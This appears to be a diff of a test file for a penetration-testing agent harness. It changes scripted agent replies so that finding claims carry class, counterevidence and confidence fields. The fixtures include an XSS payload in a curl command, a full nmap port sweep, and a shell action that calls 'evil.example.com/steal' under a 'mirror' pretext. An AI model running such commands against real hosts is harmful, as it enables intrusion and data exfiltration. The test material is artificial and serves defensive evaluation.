@@ -91,7 +91,7 @@ const replies = [
   'Time to write my reflection probe as a script so I can reuse it.\n{"action":"write_file","name":"probe.py","content":"import sys\\nprint(\'probe\')"}',
   'Let me actually LOOK at the login page like a person would.\n{"action":"browser_open","url":"http://target.test/login"}',
   'I want a picture of this desktop for the record.\n{"action":"screenshot"}',
-  'The search parameter reflected my script tag verbatim in the response — that is a reflected XSS. Claiming it with the exact command.\n{"action":"claim_finding","title":"Reflected XSS in search","evidence":"GET /search?q=<script>alert(1)</script> -> <script>alert(1)</script> reflected unencoded","command":"curl -s \'http://target.test/search?q=<script>alert(1)</script>\'"}',
+  'The search parameter reflected my script tag verbatim in the response — that is a reflected XSS. Claiming it with the exact command.\n{"action":"claim_finding","title":"Reflected XSS in search","evidence":"GET /search?q=<script>alert(1)</script> -> <script>alert(1)</script> reflected unencoded","command":"curl -s \'http://target.test/search?q=<script>alert(1)</script>\'",\"class\":\"xss\",\"counterevidence\":\"A plain-word query returned no script tag anywhere in the body; the tag appears only when injected\",\"confidence\":\"high\"}',
   'Let me pull the same data from a mirror I know.\n{"action":"shell","command":"curl -s http://evil.example.com/steal"}',
   'A full port sweep will map everything at once.\n{"action":"shell","command":"nmap -p- target.test"}',
 ];
@@ -189,7 +189,7 @@ const res2 = await humanIteration('h_human_test2', TARGET, {
   turns: 1,
   deps: {
     ...deps,
-    chat: async () => 'Found it.\n{"action":"claim_finding","title":"SQLi in login","evidence":"admin row returned","command":"curl -s http://target.test/login"}',
+    chat: async () => 'Found it.\n{"action":"claim_finding","title":"SQLi in login","class":"sqli","evidence":"The login response returned the full admin row (id 1, role admin) for a wrong password once the injection closed the query","command":"curl -s http://target.test/login","counterevidence":"The same login with a plain wrong password and no injection returned 401 invalid credentials","confidence":"high"}',
     record: (h, ev) => events2.push(ev),
     readMeta: () => meta2,
     writeMeta: (h, m) => { meta2 = m; },
